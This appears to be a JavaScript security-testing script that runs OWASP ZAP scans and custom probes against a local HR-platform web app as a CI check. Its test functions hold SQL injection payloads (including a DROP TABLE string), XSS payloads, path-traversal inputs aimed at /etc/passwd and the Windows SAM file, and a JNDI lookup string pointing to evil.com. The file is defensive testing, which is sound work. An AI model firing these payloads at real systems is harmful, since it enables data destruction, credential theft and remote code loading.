const ZapClient = require('zaproxy');

class OWASPSecurityTester {
  constructor() {
    this.zapClient = new ZapClient({
      proxy: 'http://127.0.0.1:8080'
    });
    this.targetUrl = 'http://localhost:3000';
    this.reportPath = './test-results/security-report.html';
  }

  async runSecurityScan() {
    console.log('🔒 Starting OWASP ZAP Security Scan...');
    
    try {
      // Start ZAP
      await this.startZap();
      
      // Configure ZAP
      await this.configureZap();
      
      // Run spider scan
      await this.runSpiderScan();
      
      // Run active scan
      await this.runActiveScan();
      
      // Generate report
      await this.generateReport();
      
      // Analyze results
      const results = await this.analyzeResults();
      
      console.log('✅ Security scan completed');
      return results;
      
    } catch (error) {
      console.error('❌ Security scan failed:', error);
      throw error;
    } finally {
      await this.cleanup();
    }
  }

  async startZap() {
    console.log('🚀 Starting ZAP proxy...');
    
    // Check if ZAP is already running
    try {
      await this.zapClient.core.version();
      console.log('✅ ZAP is already running');
    } catch (error) {
      console.log('Starting ZAP daemon...');
      // In a real implementation, you would start ZAP here
      // For now, assume ZAP is manually started
      throw new Error('Please start OWASP ZAP manually on port 8080');
    }
  }

  async configureZap() {
    console.log('⚙️ Configuring ZAP settings...');
    
    // Set authentication if needed
    await this.setupAuthentication();
    
    // Configure scan policies
    await this.configureScanPolicies();
    
    // Set context for the application
    await this.setupContext();
  }

  async setupAuthentication() {
    console.log('🔐 Setting up authentication...');
    
    // Create authentication context
    const contextId = await this.zapClient.context.newContext('HR-Platform');
    
    // Configure form-based authentication
    await this.zapClient.authentication.setAuthenticationMethod(
      contextId,
      'formBasedAuthentication',
      'loginUrl=http://localhost:3000/login&loginRequestData=email%3Dtest%40example.com%26password%3Dtestpassword'
    );
    
    // Set logged in/out indicators
    await this.zapClient.authentication.setLoggedInIndicator(
      contextId,
      '\\Qdashboard\\E'
    );
    
    await this.zapClient.authentication.setLoggedOutIndicator(
      contextId,
      '\\Qlogin\\E'
    );
    
    return contextId;
  }

  async configureScanPolicies() {
    console.log('📋 Configuring scan policies...');
    
    // Enable all scan rules for comprehensive testing
    const scanPolicy = 'Default Policy';
    
    // Configure specific rules for web applications
    const rules = [
      'SQL Injection',
      'Cross Site Scripting (Reflected)',
      'Cross Site Scripting (Persistent)',
      'Cross Site Request Forgery',
      'Directory Browsing',
      'Path Traversal',
      'Remote File Inclusion',
      'Server Side Include',
      'Script Active Scan Rules',
      'Server Side Code Injection',
      'Remote OS Command Injection',
      'External Redirect',
      'CRLF Injection',
      'Parameter Tampering',
      'Generic Padding Oracle',
      'Expression Language Injection',
      'Insecure HTTP Method',
      'HTTP Parameter Override',
    ];
    
    for (const rule of rules) {
      try {
        await this.zapClient.ascan.enableScanners(rule);
      } catch (error) {
        console.log(`Note: Could not enable rule ${rule}:`, error.message);
      }
    }
  }

  async setupContext() {
    console.log('🎯 Setting up scan context...');
    
    const contextName = 'HR-Platform-Context';
    
    // Include URLs in context
    const includeUrls = [
      'http://localhost:3000/api/.*',
      'http://localhost:3000/chat.*',
      'http://localhost:3000/dashboard.*',
      'http://localhost:3000/documents.*',
    ];
    
    // Exclude certain URLs from scanning
    const excludeUrls = [
      'http://localhost:3000/api/webhooks.*',
      'http://localhost:3000/.*logout.*',
    ];
    
    for (const url of includeUrls) {
      await this.zapClient.context.includeInContext(contextName, url);
    }
    
    for (const url of excludeUrls) {
      await this.zapClient.context.excludeFromContext(contextName, url);
    }
  }

  async runSpiderScan() {
    console.log('🕷️ Running spider scan...');
    
    const spiderScanId = await this.zapClient.spider.scan(this.targetUrl);
    console.log(`Spider scan started with ID: ${spiderScanId}`);
    
    // Wait for spider scan to complete
    let progress = 0;
    while (progress < 100) {
      await new Promise(resolve => setTimeout(resolve, 2000));
      progress = await this.zapClient.spider.status(spiderScanId);
      console.log(`Spider scan progress: ${progress}%`);
    }
    
    const spiderResults = await this.zapClient.spider.results(spiderScanId);
    console.log(`✅ Spider scan completed. Found ${spiderResults.length} URLs`);
    
    return spiderResults;
  }

  async runActiveScan() {
    console.log('🔍 Running active security scan...');
    
    const activeScanId = await this.zapClient.ascan.scan(this.targetUrl);
    console.log(`Active scan started with ID: ${activeScanId}`);
    
    // Wait for active scan to complete
    let progress = 0;
    while (progress < 100) {
      await new Promise(resolve => setTimeout(resolve, 5000));
      progress = await this.zapClient.ascan.status(activeScanId);
      console.log(`Active scan progress: ${progress}%`);
    }
    
    console.log('✅ Active security scan completed');
    return activeScanId;
  }

  async generateReport() {
    console.log('📊 Generating security report...');
    
    try {
      const htmlReport = await this.zapClient.core.htmlreport();
      
      const fs = require('fs');
      const path = require('path');
      
      // Ensure directory exists
      const reportDir = path.dirname(this.reportPath);
      if (!fs.existsSync(reportDir)) {
        fs.mkdirSync(reportDir, { recursive: true });
      }
      
      // Write HTML report
      fs.writeFileSync(this.reportPath, htmlReport);
      console.log(`✅ Security report generated: ${this.reportPath}`);
      
      // Also generate JSON report for programmatic analysis
      const jsonReport = await this.zapClient.core.jsonreport();
      const jsonReportPath = this.reportPath.replace('.html', '.json');
      fs.writeFileSync(jsonReportPath, jsonReport);
      console.log(`✅ JSON report generated: ${jsonReportPath}`);
      
    } catch (error) {
      console.error('Failed to generate report:', error);
    }
  }

  async analyzeResults() {
    console.log('🔬 Analyzing security scan results...');
    
    try {
      const alerts = await this.zapClient.core.alerts();
      
      const riskLevels = {
        High: [],
        Medium: [],
        Low: [],
        Informational: []
      };
      
      // Categorize alerts by risk level
      alerts.forEach(alert => {
        const risk = alert.risk || 'Informational';
        if (riskLevels[risk]) {
          riskLevels[risk].push(alert);
        }
      });
      
      // Generate summary
      const summary = {
        totalAlerts: alerts.length,
        highRisk: riskLevels.High.length,
        mediumRisk: riskLevels.Medium.length,
        lowRisk: riskLevels.Low.length,
        informational: riskLevels.Informational.length,
        alerts: riskLevels
      };
      
      // Log summary
      console.log('\n🔒 Security Scan Summary:');
      console.log(`Total Alerts: ${summary.totalAlerts}`);
      console.log(`High Risk: ${summary.highRisk}`);
      console.log(`Medium Risk: ${summary.mediumRisk}`);
      console.log(`Low Risk: ${summary.lowRisk}`);
      console.log(`Informational: ${summary.informational}`);
      
      // Log high-risk issues
      if (summary.highRisk > 0) {
        console.log('\n❌ HIGH RISK ISSUES:');
        riskLevels.High.forEach(alert => {
          console.log(`- ${alert.alert}: ${alert.name} (${alert.url})`);
        });
      }
      
      // Log medium-risk issues
      if (summary.mediumRisk > 0) {
        console.log('\n⚠️ MEDIUM RISK ISSUES:');
        riskLevels.Medium.slice(0, 5).forEach(alert => {
          console.log(`- ${alert.alert}: ${alert.name} (${alert.url})`);
        });
        if (riskLevels.Medium.length > 5) {
          console.log(`... and ${riskLevels.Medium.length - 5} more`);
        }
      }
      
      // Determine if scan passes security threshold
      const securityThreshold = {
        maxHighRisk: 0,
        maxMediumRisk: 5,
      };
      
      const passed = summary.highRisk <= securityThreshold.maxHighRisk && 
                    summary.mediumRisk <= securityThreshold.maxMediumRisk;
      
      summary.passed = passed;
      summary.threshold = securityThreshold;
      
      if (passed) {
        console.log('\n✅ Security scan PASSED');
      } else {
        console.log('\n❌ Security scan FAILED - Security issues exceed threshold');
      }
      
      return summary;
      
    } catch (error) {
      console.error('Failed to analyze results:', error);
      throw error;
    }
  }

  async runSpecificSecurityTests() {
    console.log('🧪 Running specific security tests...');
    
    const results = {};
    
    // Test SQL Injection
    results.sqlInjection = await this.testSQLInjection();
    
    // Test XSS
    results.xss = await this.testXSS();
    
    // Test Authentication
    results.authentication = await this.testAuthentication();
    
    // Test Authorization
    results.authorization = await this.testAuthorization();
    
    // Test Input Validation
    results.inputValidation = await this.testInputValidation();
    
    // Test Session Management
    results.sessionManagement = await this.testSessionManagement();
    
    return results;
  }

  async testSQLInjection() {
    console.log('🔍 Testing SQL Injection vulnerabilities...');
    
    const payloads = [
      "' OR 1=1 --",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1",
    ];
    
    const testEndpoints = [
      '/api/v1/chat/conversations',
      '/api/v1/documents/search',
      '/api/v1/analytics/metrics',
    ];
    
    const results = [];
    
    for (const endpoint of testEndpoints) {
      for (const payload of payloads) {
        try {
          // Test in query parameters
          const response = await fetch(`${this.targetUrl}${endpoint}?search=${encodeURIComponent(payload)}`);
          
          // Analyze response for SQL injection indicators
          const responseText = await response.text();
          const indicators = ['sql', 'mysql', 'postgresql', 'syntax error', 'ORA-', 'Microsoft OLE DB'];
          
          const vulnerable = indicators.some(indicator => 
            responseText.toLowerCase().includes(indicator.toLowerCase())
          );
          
          if (vulnerable) {
            results.push({
              endpoint,
              payload,
              vulnerable: true,
              response: response.status
            });
          }
        } catch (error) {
          // Ignore network errors
        }
      }
    }
    
    return {
      tested: testEndpoints.length * payloads.length,
      vulnerabilities: results
    };
  }

  async testXSS() {
    console.log('🔍 Testing XSS vulnerabilities...');
    
    const payloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "javascript:alert('XSS')",
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
    ];
    
    const testEndpoints = [
      '/api/v1/chat/conversations',
      '/api/v1/templates',
    ];
    
    const results = [];
    
    for (const endpoint of testEndpoints) {
      for (const payload of payloads) {
        try {
          const response = await fetch(`${this.targetUrl}${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: payload })
          });
          
          const responseText = await response.text();
          
          // Check if payload is reflected without encoding
          if (responseText.includes(payload)) {
            results.push({
              endpoint,
              payload,
              vulnerable: true,
              response: response.status
            });
          }
        } catch (error) {
          // Ignore network errors
        }
      }
    }
    
    return {
      tested: testEndpoints.length * payloads.length,
      vulnerabilities: results
    };
  }

  async testAuthentication() {
    console.log('🔍 Testing authentication mechanisms...');
    
    const results = {};
    
    // Test unauthenticated access to protected endpoints
    const protectedEndpoints = [
      '/api/v1/analytics/metrics',
      '/api/v1/chat/conversations',
      '/api/v1/documents',
    ];
    
    for (const endpoint of protectedEndpoints) {
      try {
        const response = await fetch(`${this.targetUrl}${endpoint}`);
        results[endpoint] = {
          status: response.status,
          requiresAuth: response.status === 401 || response.status === 403
        };
      } catch (error) {
        results[endpoint] = { error: error.message };
      }
    }
    
    return results;
  }

  async testAuthorization() {
    console.log('🔍 Testing authorization controls...');
    
    // This would test role-based access control
    // Implementation would depend on your specific auth system
    
    return {
      message: 'Authorization tests require specific auth tokens - implement based on your auth system'
    };
  }

  async testInputValidation() {
    console.log('🔍 Testing input validation...');
    
    const maliciousInputs = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
      '<%= 7*7 %>',
      '${7*7}',
      '#{7*7}',
    ];
    
    const results = [];
    
    for (const input of maliciousInputs) {
      try {
        const response = await fetch(`${this.targetUrl}/api/v1/chat/conversations`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ title: input, initialMessage: 'test' })
        });
        
        const responseText = await response.text();
        
        // Check for successful injection or error disclosure
        if (responseText.includes('49') || responseText.includes('error') || responseText.includes('exception')) {
          results.push({
            input,
            vulnerable: true,
            response: response.status
          });
        }
      } catch (error) {
        // Ignore network errors
      }
    }
    
    return {
      tested: maliciousInputs.length,
      vulnerabilities: results
    };
  }

  async testSessionManagement() {
    console.log('🔍 Testing session management...');
    
    const results = {};
    
    // Test session cookies security
    try {
      const response = await fetch(`${this.targetUrl}/login`);
      const cookies = response.headers.get('set-cookie');
      
      if (cookies) {
        results.cookies = {
          httpOnly: cookies.includes('HttpOnly'),
          secure: cookies.includes('Secure'),
          sameSite: cookies.includes('SameSite')
        };
      }
    } catch (error) {
      results.error = error.message;
    }
    
    return results;
  }

  async cleanup() {
    console.log('🧹 Cleaning up...');
    // Cleanup ZAP session if needed
  }
}

// Main execution
async function runSecurityTests() {
  const tester = new OWASPSecurityTester();
  
  try {
    // Run comprehensive OWASP ZAP scan
    const zapResults = await tester.runSecurityScan();
    
    // Run specific security tests
    const specificResults = await tester.runSpecificSecurityTests();
    
    // Generate final report
    const finalReport = {
      timestamp: new Date().toISOString(),
      zapScan: zapResults,
      specificTests: specificResults,
      passed: zapResults.passed && Object.values(specificResults).every(test => 
        !test.vulnerabilities || test.vulnerabilities.length === 0
      )
    };
    
    // Save final report
    const fs = require('fs');
    fs.writeFileSync('./test-results/security-final-report.json', JSON.stringify(finalReport, null, 2));
    
    console.log('\n🏁 Security testing completed');
    console.log(`Final result: ${finalReport.passed ? '✅ PASSED' : '❌ FAILED'}`);
    
    // Exit with appropriate code for CI/CD
    process.exit(finalReport.passed ? 0 : 1);
    
  } catch (error) {
    console.error('Security testing failed:', error);
    process.exit(1);
  }
}

// Run if called directly
if (require.main === module) {
  runSecurityTests();
}

module.exports = { OWASPSecurityTester };